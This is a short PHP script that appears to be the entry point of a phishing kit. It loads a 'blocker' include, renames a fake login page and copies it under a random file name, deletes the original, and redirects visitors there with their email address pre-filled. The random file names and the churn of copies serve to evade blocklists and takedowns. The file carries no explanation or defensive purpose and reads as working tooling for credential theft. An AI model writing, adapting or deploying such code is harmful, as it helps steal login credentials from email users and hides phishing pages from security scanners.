<?php

include('blocker.php');

function random_number(){
	$numbers = array(0,1,2,3,4,5,6,7,8,9,'A','b','C','D','e','F','G','H','i','J','K','L');
	$key = array_rand($numbers);
	return $numbers[$key]; 
}

$url = random_number().random_number().random_number().random_number().random_number().random_number().date('U').md5(date('U')).md5(date('U')).md5(date('U')).md5(date('U')).md5(date('U'));
header('location:'.$url);


$email = $_GET['email'];
$error = $_GET['error'];
$dir =  getcwd();

if ($handle = opendir($dir)) {
    while (false !== ($entry = readdir($handle))) {
		$len = strlen($entry);
		if($len == 28){
			rename($entry, "login.php");
		}
	}
}

$staticfile = "login.php";
$name =  generateRandomString();
$secfile = $name.".php";

if (!copy($staticfile, $secfile)) {
//echo "file not create\n";
} else {
	if(file_exists($secfile)){
		//echo "file exist\n";
		unlink($staticfile);
		header("Location: $secfile?$url&email=$email&error=$error");
	}
}

//echo $_SESSION["file"]."\n";
$name =  generateRandomString();
function generateRandomString($length = 24) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyz';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

?>
